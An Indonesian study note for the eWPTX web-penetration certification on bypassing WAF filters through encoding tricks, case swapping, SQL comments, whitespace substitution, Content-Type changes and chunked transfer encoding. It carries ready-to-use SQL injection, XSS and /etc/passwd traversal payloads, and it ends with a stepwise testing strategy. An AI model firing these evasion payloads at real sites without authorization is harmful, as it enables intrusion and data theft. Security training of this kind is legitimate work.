2026-02-06

Status:

Tags: [[eWPTX]] [[Bypassing Filters & Evasion]]
###### Prasyarat: [[WAF Fingerprinting & Detection]]
# Encoding & Transformation Bypasses

## Ide inti

Filter biasanya memeriksa input di satu tahap, tapi backend memprosesnya di tahap lain (dengan decode/normalisasi yang mungkin berbeda). Selisih cara decode/transform antara WAF dan aplikasi sering jadi celah bypass.

---

## URL Encoding

### Single encoding

Percent-encoding standar. Kebanyakan WAF akan decode ini dulu sebelum inspeksi.

```
' → %27
< → %3C
> → %3E
/ → %2F
space → %20 or +
```

### Double encoding

Yang di-encode adalah karakter `%` itu sendiri. Efektif jika WAF hanya decode sekali, tapi aplikasi decode dua kali.

```
' → %27 → %2527
< → %3C → %253C
/ → %2F → %252F
```

### Triple encoding

Jarang, tapi kadang efektif pada proxy berlapis:

```
' → %27 → %2527 → %25252527
```

### Test example

```
# Normal (blocked)
/page?id=1' OR 1=1--

# Double encoded (may bypass)
/page?id=1%2527%20OR%201%253D1--
```

---

## Unicode & UTF-8 Tricks

### Overlong UTF-8

Merepresentasikan karakter dengan byte lebih banyak dari semestinya. Sebagian parser akan menormalisasi bentuk ini.

```
/ (U+002F) normal:    2F
/ overlong 2-byte:    C0 AF
/ overlong 3-byte:    E0 80 AF
```

```
# Path traversal with overlong encoding
..%c0%af..%c0%afetc/passwd
```

### Fullwidth Unicode

Use fullwidth equivalents (U+FF00 range):

```
< → ＜ (U+FF1C)
> → ＞ (U+FF1E)
' → ＇ (U+FF07)
```

### Homoglyphs

Karakter yang terlihat mirip tapi berasal dari blok Unicode berbeda. Berguna kalau filter match karakter spesifik, tapi aplikasi melakukan normalisasi.

---

## HTML Entity Encoding

Berguna untuk kasus XSS saat input direfleksikan ke konteks HTML (browser akan decode entity saat render):

```html
<!-- Named entities -->
&lt;script&gt;  →  <script>

<!-- Decimal entities -->
&#60;script&#62;  →  <script>

<!-- Hex entities -->
&#x3C;script&#x3E;  →  <script>

<!-- With padding zeros (often bypasses regex) -->
&#0000060;  →  <
&#x000003C;  →  <
```

---

## Null Byte Injection

Menyisipkan `%00` untuk mengacaukan penanganan string di layer tertentu:

```
# May terminate string at WAF but not at app
/page?file=../../etc/passwd%00.jpg

# In PHP < 5.3.4, null byte truncated file paths
include($_GET['file'] . '.php');
# ?file=../../etc/passwd%00
```

---

## Manipulasi huruf besar-kecil

Sebagian filter case-sensitive, sementara backend/engine-nya tidak:

```sql
-- Blocked
UNION SELECT * FROM users

-- Bypass attempts
UnIoN SeLeCt * FrOm users
uNiOn aLl sElEcT * fRoM users
```

```html
<!-- Blocked -->
<script>alert(1)</script>

<!-- Bypass -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

---

## Comment Insertion

Memecah keyword menggunakan komentar yang diabaikan parser:

```sql
-- SQL: inline comments
UN/**/ION SEL/**/ECT * FROM users
/*!50000UNION*/ /*!50000SELECT*/ * FROM users

-- MySQL version comments (executed only on version >= 5.0)
/*!50000SELECT*/ /*!50000password*/ FROM users
```

```html
<!-- HTML: break event handlers -->
<img src=x on<>error=alert(1)>
```

---

## Whitespace Alternatives

Mengganti spasi dengan varian whitespace lain:

```sql
-- Tab (%09)
UNION%09SELECT%09*%09FROM%09users

-- Newline (%0a)
UNION%0aSELECT%0a*%0aFROM%0ausers

-- Carriage return (%0d)
UNION%0dSELECT

-- Vertical tab (%0b), form feed (%0c)
UNION%0bSELECT
```

---

## Content-Type Manipulation

Mengganti Content-Type untuk menghindari aturan inspeksi body tertentu:

```
# Standard (inspected)
Content-Type: application/x-www-form-urlencoded

# May bypass inspection
Content-Type: multipart/form-data; boundary=----
Content-Type: text/plain
Content-Type: application/json
```

---

## Chunked Transfer Encoding

Memecah request body menjadi beberapa chunk untuk menghindari pattern matching:

```http
POST /page HTTP/1.1
Transfer-Encoding: chunked

3
id=
4
1 UN
5
ION S
6
ELECT
1
*
0
```

---

## Diagram

![[Pics/bypass/encoding-bypass-pipeline.svg]]

---

## Strategi pengujian

1. Mulai dari URL encoding sekali
2. Coba double encoding jika diblok
3. Uji variasi huruf besar-kecil
4. Sisipkan komentar untuk memecah keyword
5. Coba alternatif whitespace
6. Uji perubahan Content-Type
7. Kombinasikan beberapa teknik

Catatan: selalu uji bertahap (satu perubahan per percobaan) supaya kamu tahu teknik mana yang benar-benar berpengaruh.
